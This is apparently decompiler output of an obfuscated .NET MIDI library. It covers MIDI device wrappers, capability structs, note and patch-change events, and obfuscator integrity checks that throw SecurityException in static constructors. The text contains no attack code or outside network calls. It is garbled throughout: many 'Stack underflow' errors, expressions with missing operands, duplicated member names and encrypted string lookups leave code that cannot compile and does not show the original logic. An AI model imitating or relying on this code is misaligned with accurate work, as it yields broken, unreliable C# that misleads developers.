		public event EventHandler<global::_001F._0010> ErrorReceived
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_001F._0010> eventHandler = ((_0010)/*Error near IL_0007: Stack underflow*/).m__0002;
				EventHandler<global::_001F._0010> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_001F._0010>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_001F._0010> value2 = (EventHandler<global::_001F._0010>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this.m__0002, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_001F._0010> eventHandler = ((_0010)/*Error near IL_0007: Stack underflow*/).m__0002;
				EventHandler<global::_001F._0010> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_001F._0010>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_001F._0010> value2 = (EventHandler<global::_001F._0010>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this.m__0002, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public _0010(int _0014_0091_0006)
		{
			this.m__0001 = _0001;
			global::_0011._0018._0001(global::_0011._0018._0001(out this._0001, (IntPtr)_0014_0091_0006, this.m__0001, IntPtr.Zero, 196608), global::_0080._0014._0001(107382856));
		}

		public void _0001()
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			((_0010)/*Error near IL_000d: Stack underflow*/)._0002();
		}

		public void _0002()
		{
			//IL_0023: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 1
			_ = _0091_0002._009E_0005;
			global::_0018._0012._0003 obj = ((_0010)/*Error near IL_000c: Stack underflow*/).m__0001;
			/*Error near IL_002a: Stack underflow*/(obj);
			((_0010)/*Error near IL_0016: Stack underflow*/)._0001(_0002: true);
			_0091_0002._009B_0005(this);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0002();
		}

		private void _0001(IntPtr _0002, global::_0018._0012._0001 _0003, IntPtr _0004, IntPtr _0005, IntPtr _0006)
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0040: Expected I4, but got Unknown
			//IL_0094: Incompatible stack heights: 0 vs 1
			//IL_009a: Incompatible stack heights: 0 vs 1
			//IL_009d: Incompatible stack heights: 0 vs 1
			switch (/*Error near IL_000b: Stack underflow*/ - 961)
			{
			case 2:
				if (((_0010)/*Error near IL_0048: Stack underflow*/).m__0001 != null)
				{
					((_0010)/*Error near IL_0051: Stack underflow*/).m__0001(this, new global::_001F._0010(_0005.ToInt32(), _0006.ToInt32()));
				}
				break;
			case 4:
				if (this.m__0002 != null)
				{
					this.m__0002(this, new global::_001F._0010(_0005.ToInt32(), _0006.ToInt32()));
				}
				break;
			case 0:
			case 1:
			case 3:
			case 5:
			case 6:
			case 7:
			case 8:
			case 9:
			case 10:
			case 11:
				break;
			}
		}

		protected virtual void _0001(bool _0002)
		{
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			if (!((_0010)/*Error near IL_0007: Stack underflow*/).m__0001)
			{
				global::_0011._0018._0001(((_0010)/*Error near IL_0010: Stack underflow*/)._0001);
			}
			this.m__0001 = true;
		}

		protected override void _0003()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			try
			{
				((_0010)/*Error near IL_000f: Stack underflow*/)._0001(_0002: false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		static _0010()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _000E
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
	internal struct _0014
	{
		private ushort _0001;

		private ushort _0002;

		private uint _0001;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
		private string _0001;

		private int _0001;

		private const int _0002 = 32;

		public global::_0005._0001 Manufacturer => (global::_0005._0001)((_0014)/*Error near IL_0007: Stack underflow*/)._0001;

		public int ProductId => ((_0014)/*Error near IL_0007: Stack underflow*/)._0002;

		public string ProductName => ((_0014)/*Error near IL_0007: Stack underflow*/)._0001;
	}
}
namespace _0018
{
	internal sealed class _0012
	{
		public enum _0001
		{
			_0001 = 961,
			_0002 = 962,
			_0003 = 963,
			_0004 = 964,
			_0005 = 965,
			_0006 = 966,
			_0007 = 972
		}

		public enum _0002
		{
			_0001 = 967,
			_0002,
			_0003
		}

		public delegate void _0003(IntPtr midiInHandle, _0001 message, IntPtr userData, IntPtr messageParameter1, IntPtr messageParameter2);

		public delegate void _0004(IntPtr midiInHandle, _0002 message, IntPtr userData, IntPtr messageParameter1, IntPtr messageParameter2);

		public struct _0005
		{
			public int _0001;

			public int _0002;
		}

		public struct _0006
		{
			public int _0001;

			public int _0002;

			public int _0003;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
			public int _0004;
		}

		public struct _0007
		{
			public IntPtr _0001;

			public int _0001;

			public int _0002;

			public IntPtr _0002;

			public int _0003;

			public IntPtr _0003;

			public IntPtr _0004;

			public int _0004;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
			public IntPtr[] _0001;
		}

		public struct _0008
		{
			public int _0001;

			public int _0002;
		}

		public const int _0001 = 196608;

		public const int _0002 = 0;
	}
}
namespace _0017
{
	internal sealed class _0017
	{
		private int _0001;

		public int RawData => ((_0017)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0017(int _0015_0091_0006, int _0016_0091_0006, int _0017_0091_0006)
		{
			_0001 = _0015_0091_0006 + (_0016_0091_0006 << 8) + (_0017_0091_0006 << 16);
		}

		public _0017(int _009E_008D)
		{
			_0001 = _009E_008D;
		}

		static _0017()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0001
{
	internal sealed class _0010 : IDisposable
	{
		internal IntPtr _0001 = IntPtr.Zero;

		private bool m__0001;

		private global::_0018._0012._0004 m__0001;

		public static int NumberOfDevices
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001();
				return (int)/*Error near IL_0003: Stack underflow*/;
			}
		}

		public int Volume
		{
			get
			{
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_002a: Incompatible stack heights: 0 vs 1
				int result = 0;
				global::_0011._0018._0001(((_0010)/*Error near IL_000a: Stack underflow*/)._0001, ref result);
				global::_0011._0018._0001(_0003: global::_0080._0014._0001(107382822), _0002: (MmResult)/*Error near IL_001d: Stack underflow*/);
				return result;
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_001f: Incompatible stack heights: 0 vs 2
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = ((_0010)/*Error near IL_0007: Stack underflow*/)._0001;
				global::_0011._0018._0001((IntPtr)/*Error near IL_0026: Stack underflow*/, (int)/*Error near IL_0026: Stack underflow*/);
				global::_0011._0018._0001(_0003: global::_0080._0014._0001(107382797), _0002: (MmResult)/*Error near IL_001a: Stack underflow*/);
			}
		}

		public _0010(int _0014_0091_0006)
		{
			this.m__0001 = _0001;
			global::_0011._0018._0001(global::_0011._0018._0001(out this._0001, (IntPtr)_0014_0091_0006, this.m__0001, IntPtr.Zero, 196608), global::_0080._0014._0001(107382871));
		}

		public void _0001()
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			((_0010)/*Error near IL_000d: Stack underflow*/)._0002();
		}

		public void _0002()
		{
			//IL_0023: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 1
			_ = _0091_0002._009E_0005;
			global::_0018._0012._0004 obj = ((_0010)/*Error near IL_000c: Stack underflow*/).m__0001;
			/*Error near IL_002a: Stack underflow*/(obj);
			((_0010)/*Error near IL_0016: Stack underflow*/)._0001(_0002: true);
			_0091_0002._009B_0005(this);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0002();
		}

		protected virtual void _0001(bool _0002)
		{
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			if (!((_0010)/*Error near IL_0007: Stack underflow*/).m__0001)
			{
				global::_0011._0018._0001(((_0010)/*Error near IL_0010: Stack underflow*/)._0001);
			}
			this.m__0001 = true;
		}

		private void _0001(IntPtr _0002, global::_0018._0012._0002 _0003, IntPtr _0004, IntPtr _0005, IntPtr _0006)
		{
		}

		protected override void _0003()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			try
			{
				((_0010)/*Error near IL_000f: Stack underflow*/)._0001(_0002: false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}
	}
}
namespace _0005
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
	internal struct _0011
	{
		[Flags]
		private enum _0001
		{
			_0001 = 1,
			_0002 = 2,
			_0003 = 4,
			_0004 = 8
		}

		private short m__0001;

		private short _0002;

		private int m__0001;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
		private string m__0001;

		private short _0003;

		private short _0004;

		private short _0005;

		private ushort m__0001;

		private _0001 m__0001;

		private const int _0002 = 32;

		public global::_0005._0001 Manufacturer => (global::_0005._0001)((_0011)/*Error near IL_0007: Stack underflow*/).m__0001;

		public short ProductId => ((_0011)/*Error near IL_0007: Stack underflow*/)._0002;

		public string ProductName => ((_0011)/*Error near IL_0007: Stack underflow*/).m__0001;

		public int Voices => ((_0011)/*Error near IL_0007: Stack underflow*/)._0004;

		public int Notes => ((_0011)/*Error near IL_0007: Stack underflow*/)._0005;

		public bool SupportsAllChannels => ((_0011)/*Error near IL_0007: Stack underflow*/).m__0001 == ushort.MaxValue;

		public bool SupportsPatchCaching => (((_0011)/*Error near IL_0007: Stack underflow*/).m__0001 & _0011._0001._0003) != 0;

		public bool SupportsSeparateLeftAndRightVolume => (((_0011)/*Error near IL_0007: Stack underflow*/).m__0001 & _0011._0001._0002) != 0;

		public bool SupportsMidiStreamOut => (((_0011)/*Error near IL_0007: Stack underflow*/).m__0001 & _0011._0001._0004) != 0;

		public bool SupportsVolumeControl => (((_0011)/*Error near IL_0007: Stack underflow*/).m__0001 & _0011._0001._0001) != 0;

		public global::_0018._0013 Technology => (global::_0018._0013)((_0011)/*Error near IL_0007: Stack underflow*/)._0003;

		public bool _0001(int _0002)
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_000f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0012: Invalid comparison between Unknown and I4
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 3
			_ = ((_0011)/*Error near IL_0007: Stack underflow*/).m__0001;
			_ = 1;
			_003F val = /*Error near IL_000c: Stack underflow*/- 1;
			_003F val2 = /*Error near IL_0010: Stack underflow*/<< (int)val;
			return (/*Error near IL_0011: Stack underflow*/ & val2) > 0;
		}
	}
}
namespace _0018
{
	internal enum _0013
	{
		_0001 = 1,
		_0002,
		_0003,
		_0004,
		_0005,
		_0006,
		_0007
	}
}
namespace _0013
{
	internal class _0011 : _0010
	{
		private new int m__0001;

		internal new int _0002;

		private new static readonly string[] m__0001;

		public virtual int NoteNumber
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0011)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_0003: Invalid comparison between Unknown and I4
				//IL_0009: Invalid comparison between Unknown and I4
				//IL_002b: Incompatible stack heights: 0 vs 1
				//IL_002e: Incompatible stack heights: 0 vs 1
				//IL_0035: Incompatible stack heights: 0 vs 1
				if ((int)/*Error near IL_0005: Stack underflow*/ < 0 || (int)/*Error near IL_000b: Stack underflow*/ > 127)
				{
					_0080._0014._0001(107388827);
					throw new ArgumentOutOfRangeException(message: _0080._0014._0001(107382804), paramName: (string?)/*Error near IL_0021: Stack underflow*/);
				}
				this.m__0001 = value;
			}
		}

		public int Velocity
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0011)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			set
			{
				//IL_0003: Invalid comparison between Unknown and I4
				//IL_0009: Invalid comparison between Unknown and I4
				//IL_002b: Incompatible stack heights: 0 vs 1
				//IL_002e: Incompatible stack heights: 0 vs 1
				//IL_0035: Incompatible stack heights: 0 vs 1
				if ((int)/*Error near IL_0005: Stack underflow*/ < 0 || (int)/*Error near IL_000b: Stack underflow*/ > 127)
				{
					_0080._0014._0001(107388827);
					throw new ArgumentOutOfRangeException(message: _0080._0014._0001(107383263), paramName: (string?)/*Error near IL_0021: Stack underflow*/);
				}
				_0002 = value;
			}
		}

		public string NoteName
		{
			get
			{
				//IL_000c: Invalid comparison between Unknown and I4
				//IL_034a: Incompatible stack heights: 0 vs 1
				//IL_0354: Incompatible stack heights: 0 vs 1
				//IL_035a: Incompatible stack heights: 0 vs 1
				_ = ((_0010)/*Error near IL_0354: Stack underflow*/).Channel;
				if ((int)/*Error near IL_000e: Stack underflow*/ == 16 || ((_0010)/*Error near IL_0018: Stack underflow*/).Channel == 10)
				{
					return this.m__0001 switch
					{
						35 => _0080._0014._0001(107383182), 
						36 => _0080._0014._0001(107383189), 
						37 => _0080._0014._0001(107383140), 
						38 => _0080._0014._0001(107383155), 
						39 => _0080._0014._0001(107383134), 
						40 => _0080._0014._0001(107383121), 
						41 => _0080._0014._0001(107383100), 
						42 => _0080._0014._0001(107383047), 
						43 => _0080._0014._0001(107383058), 
						44 => _0080._0014._0001(107382525), 
						45 => _0080._0014._0001(107382476), 
						46 => _0080._0014._0001(107382495), 
						47 => _0080._0014._0001(107382446), 
						48 => _0080._0014._0001(107382461), 
						49 => _0080._0014._0001(107382412), 
						50 => _0080._0014._0001(107382423), 
						51 => _0080._0014._0001(107382378), 
						52 => _0080._0014._0001(107382389), 
						53 => _0080._0014._0001(107382336), 
						54 => _0080._0014._0001(107382355), 
						55 => _0080._0014._0001(107382306), 
						56 => _0080._0014._0001(107382285), 
						57 => _0080._0014._0001(107382272), 
						58 => _0080._0014._0001(107382763), 
						59 => _0080._0014._0001(107382782), 
						60 => _0080._0014._0001(107382729), 
						61 => _0080._0014._0001(107382748), 
						62 => _0080._0014._0001(107382703), 
						63 => _0080._0014._0001(107382714), 
						64 => _0080._0014._0001(107382661), 
						65 => _0080._0014._0001(107382680), 
						66 => _0080._0014._0001(107382631), 
						67 => _0080._0014._0001(107382646), 
						68 => _0080._0014._0001(107382597), 
						69 => _0080._0014._0001(107382616), 
						70 => _0080._0014._0001(107382575), 
						71 => _0080._0014._0001(107382562), 
						72 => _0080._0014._0001(107382541), 
						73 => _0080._0014._0001(107382556), 
						74 => _0080._0014._0001(107381995), 
						75 => _0080._0014._0001(107382010), 
						76 => _0080._0014._0001(107382001), 
						77 => _0080._0014._0001(107381980), 
						78 => _0080._0014._0001(107381927), 
						79 => _0080._0014._0001(107381942), 
						80 => _0080._0014._0001(107381893), 
						81 => _0080._0014._0001(107381904), 
						_ => _0008_0002._0007_0005(_0080._0014._0001(107381883), this.m__0001), 
					};
				}
				int num = this.m__0001 / 12;
				return _009D._0093_0004(_0080._0014._0001(107381838), _0011.m__0001[this.m__0001 % 12], num);
			}
		}

		public _0011(BinaryReader _0086_0088_0003)
		{
			NoteNumber = _0086_0088_0003.ReadByte();
			_0002 = _0086_0088_0003.ReadByte();
			if (_0002 > 127)
			{
				_0002 = 127;
			}
		}

		public _0011(long _0004_0091_0006, int _008D_0090_0006, MidiCommandCode _0010_0091_0006, int _0018_0091_0006, int _0019_0091_0006)
			: base(_0004_0091_0006, _008D_0090_0006, _0010_0091_0006)
		{
			NoteNumber = _0018_0091_0006;
			Velocity = _0019_0091_0006;
		}

		public override int _0001()
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Expected I4, but got Unknown
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			((_0010)/*Error near IL_0021: Stack underflow*/)._0001();
			int num = ((_0011)/*Error near IL_000b: Stack underflow*/).m__0001;
			return /*Error near IL_000e: Stack underflow*/+ (num << 8) + (_0002 << 16);
		}

		public override string ToString()
		{
			//IL_002c: Incompatible stack heights: 0 vs 2
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			_ = _0089_0002._0092_0005;
			_0080._0014._0001(107381829);
			((_0010)/*Error near IL_0036: Stack underflow*/).ToString();
			string text = NoteName;
			object obj = _0002;
			return /*Error near IL_0026: Stack underflow*/((string)/*Error near IL_0026: Stack underflow*/, (object)/*Error near IL_0026: Stack underflow*/, text, obj);
		}

		public unsafe override void _0001(ref long _0002, BinaryWriter _0003)
		{
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 1
			((_0010)/*Error near IL_000b: Stack underflow*/)._0001(ref *(long*)/*Error near IL_000b: Stack underflow*/, (BinaryWriter)/*Error near IL_000b: Stack underflow*/);
			_0084_0003._007E_007F_0007(_0003, (byte)this.m__0001);
			_0084_0003._007E_007F_0007(_0003, (byte)this._0002);
		}

		static _0011()
		{
			//IL_0164: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_016a: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				throw new SecurityException(_0080._0014._0001(107396706));
			}
			_0011.m__0001 = new string[12]
			{
				_0080._0014._0001(107394664),
				_0080._0014._0001(107381840),
				_0080._0014._0001(107381803),
				_0080._0014._0001(107381798),
				_0080._0014._0001(107381793),
				_0080._0014._0001(107381820),
				_0080._0014._0001(107381815),
				_0080._0014._0001(107381810),
				_0080._0014._0001(107381773),
				_0080._0014._0001(107381768),
				_0080._0014._0001(107381763),
				_0080._0014._0001(107381790)
			};
		}
	}
}
namespace _007F
{
	internal sealed class _0010 : global::_0013._0011
	{
		internal new global::_0013._0011 _0001;

		public global::_0013._0011 OffEvent
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0010)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_0058: Incompatible stack heights: 0 vs 1
				//IL_005f: Incompatible stack heights: 0 vs 1
				//IL_0066: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((global::_0013._0010)/*Error near IL_005f: Stack underflow*/);
				if ((int)/*Error near IL_0006: Stack underflow*/ == 0)
				{
					_0080._0014._0001(107381785);
					throw new ArgumentException((string?)/*Error near IL_0012: Stack underflow*/);
				}
				if (value.NoteNumber != NoteNumber)
				{
					throw new ArgumentException(_0080._0014._0001(107382236));
				}
				if (value.Channel != Channel)
				{
					throw new ArgumentException(_0080._0014._0001(107382171));
				}
				this._0001 = value;
			}
		}

		public override int NoteNumber
		{
			get
			{
				//IL_0006: Incompatible stack heights: 0 vs 1
				//IL_000d: Incompatible stack heights: 0 vs 1
				_ = ((global::_0013._0011)/*Error near IL_000d: Stack underflow*/).NoteNumber;
				return (int)/*Error near IL_0005: Stack underflow*/;
			}
			set
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 1
				((global::_0013._0011)/*Error near IL_002b: Stack underflow*/).NoteNumber = (int)/*Error near IL_002b: Stack underflow*/;
				if (this._0001 != null)
				{
					this._0001.NoteNumber = NoteNumber;
				}
			}
		}

		public override int Channel
		{
			get
			{
				//IL_0006: Incompatible stack heights: 0 vs 1
				//IL_000d: Incompatible stack heights: 0 vs 1
				_ = ((global::_0013._0010)/*Error near IL_000d: Stack underflow*/).Channel;
				return (int)/*Error near IL_0005: Stack underflow*/;
			}
			set
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 1
				((global::_0013._0010)/*Error near IL_002b: Stack underflow*/).Channel = (int)/*Error near IL_002b: Stack underflow*/;
				if (this._0001 != null)
				{
					this._0001.Channel = Channel;
				}
			}
		}

		public int NoteLength
		{
			get
			{
				//IL_0013: Unknown result type (might be due to invalid IL or missing references)
				//IL_0017: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 2
				_ = ((global::_0013._0010)((_0010)/*Error near IL_0007: Stack underflow*/)._0001)._0001;
				long num = ((global::_0013._0010)/*Error near IL_0013: Stack underflow*/)._0001;
				return (int)(/*Error near IL_0014: Stack underflow*/ - num);
			}
			set
			{
				//IL_0003: Invalid comparison between Unknown and I4
				//IL_0025: Incompatible stack heights: 0 vs 1
				//IL_002c: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				if ((int)/*Error near IL_0005: Stack underflow*/ < 0)
				{
					_0080._0014._0001(107382110);
					new ArgumentException((string?)/*Error near IL_0033: Stack underflow*/);
					throw /*Error near IL_000f: Stack underflow*/;
				}
				((global::_0013._0010)this._0001)._0001 = ((global::_0013._0010)this)._0001 + value;
			}
		}

		public _0010(BinaryReader _0086_0088_0003)
			: base(_0086_0088_0003)
		{
		}

		public _0010(long _0004_0091_0006, int _008D_0090_0006, int _0018_0091_0006, int _0019_0091_0006, int _001A_0091_0006)
			: base(_0004_0091_0006, _008D_0090_0006, MidiCommandCode.NoteOn, _0018_0091_0006, _0019_0091_0006)
		{
			OffEvent = new global::_0013._0011(_0004_0091_0006, _008D_0090_0006, MidiCommandCode.NoteOff, _0018_0091_0006, 0);
			NoteLength = _001A_0091_0006;
		}

		public override global::_0013._0010 _0001()
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 2
			//IL_002e: Incompatible stack heights: 0 vs 1
			_ = ((global::_0013._0010)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = ((global::_0013._0010)/*Error near IL_002e: Stack underflow*/).Channel;
			return new _0010(_0018_0091_0006: NoteNumber, _0019_0091_0006: _0002, _001A_0091_0006: NoteLength, _0004_0091_0006: (long)/*Error near IL_0022: Stack underflow*/, _008D_0090_0006: (int)/*Error near IL_0022: Stack underflow*/);
		}

		public override string ToString()
		{
			//IL_0063: Incompatible stack heights: 0 vs 1
			//IL_0066: Incompatible stack heights: 0 vs 1
			//IL_006d: Incompatible stack heights: 0 vs 2
			if (((global::_0013._0011)/*Error near IL_0007: Stack underflow*/)._0002 == 0 && ((_0010)/*Error near IL_0010: Stack underflow*/)._0001 == null)
			{
				_ = _0008_0002._0007_0005;
				_0080._0014._0001(107382065);
				string text = base.ToString();
				return /*Error near IL_0029: Stack underflow*/((string)/*Error near IL_0029: Stack underflow*/, text);
			}
			return string.Format(_0080._0014._0001(107382044), base.ToString(), (this._0001 == null) ? _0080._0014._0001(107381483) : NoteLength.ToString());
		}
	}
}
namespace _0007
{
	internal sealed class _0012 : global::_0013._0010
	{
		private new byte m__0001;

		internal new static readonly string[] _0001;

		public int Patch
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0012)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_0003: Invalid comparison between Unknown and I4
				//IL_0009: Invalid comparison between Unknown and I4
				//IL_002c: Incompatible stack heights: 0 vs 1
				//IL_002f: Incompatible stack heights: 0 vs 1
				//IL_0036: Incompatible stack heights: 0 vs 1
				if ((int)/*Error near IL_0005: Stack underflow*/ < 0 || (int)/*Error near IL_000b: Stack underflow*/ > 127)
				{
					_0080._0014._0001(107388827);
					throw new ArgumentOutOfRangeException(message: _0080._0014._0001(107381489), paramName: (string?)/*Error near IL_0021: Stack underflow*/);
				}
				this.m__0001 = (byte)value;
			}
		}

		public _0012(BinaryReader _0086_0088_0003)
		{
			this.m__0001 = _0086_0088_0003.ReadByte();
			if ((this.m__0001 & 0x80u) != 0)
			{
				throw new FormatException(_0080._0014._0001(107381478));
			}
		}

		public _0012(long _0004_0091_0006, int _008D_0090_0006, int _001B_0091_0006)
			: base(_0004_0091_0006, _008D_0090_0006, MidiCommandCode.PatchChange)
		{
			Patch = _001B_0091_0006;
		}

		public override string ToString()
		{
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			_ = _009D._0093_0004;
			_0080._0014._0001(107395853);
			((global::_0013._0010)/*Error near IL_0030: Stack underflow*/).ToString();
			string text = global::_0011._0018._0001((int)this.m__0001);
			return /*Error near IL_0020: Stack underflow*/((string)/*Error near IL_0020: Stack underflow*/, (object)/*Error near IL_0020: Stack underflow*/, text);
		}

		public override int _0001()
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_000f: Expected I4, but got Unknown
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			((global::_0013._0010)/*Error near IL_0017: Stack underflow*/)._0001();
			byte num = ((_0012)/*Error near IL_000b: Stack underflow*/).m__0001;
			return /*Error near IL_000e: Stack underflow*/+ (num << 8);
		}

		public unsafe override void _0001(ref long _0002, BinaryWriter _0003)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			((global::_0013._0010)/*Error near IL_000b: Stack underflow*/)._0001(ref *(long*)/*Error near IL_000b: Stack underflow*/, (BinaryWriter)/*Error near IL_000b: Stack underflow*/);
			_0084_0003._007E_007F_0007(_0003, this.m__0001);
		}

		static _0012()
		{
			//IL_07bf: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_07c5: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				throw new SecurityException(_0080._0014._0001(107396706));
			}
			_0012._0001 = new string[128]
			{
				_0080._0014._0001(107381436),
				_0080._0014._0001(107381383),
				_0080._0014._0001(107381394),
				_0080._0014._0001(107381373),
				_0080._0014._0001(107381324),
				_0080._0014._0001(107381331),
				_0080._0014._0001(107381306),
				_0080._0014._0001(107381257),
				_0080._0014._0001(107381248),
				_0080._0014._0001(107381267),
				_0080._0014._0001(107381730),
				_0080._0014._0001(107381749),
				_0080._0014._0001(107381700),
				_0080._0014._0001(107381719),
				_0080._0014._0001(107381674),
				_0080._0014._0001(107381685),
				_0080._0014._0001(107381640),
				_0080._0014._0001(107381651),
				_0080._0014._0001(107381626),
				_0080._0014._0001(107381577),
				_0080._0014._0001(107381592),
				_0080._0014._0001(107381543),
				_0080._0014._0001(107381562),
				_0080._0014._0001(107381517),
				_0080._0014._0001(107381528),
				_0080._0014._0001(107380983),
				_0080._0014._0001(107380950),
				_0080._0014._0001(107380921),
				_0080._0014._0001(107380888),
				_0080._0014._0001(107380855),
				_0080._0014._0001(107380830),
				_0080._0014._0001(107380773),
				_0080._0014._0001(107380748),
				_0080._0014._0001(107380759),
				_0080._0014._0001(107381242),
				_0080._0014._0001(107381213),
				_0080._0014._0001(107381160),
				_0080._0014._0001(107381175),
				_0080._0014._0001(107381126),
				_0080._0014._0001(107381141),
				_0080._0014._0001(107381092),
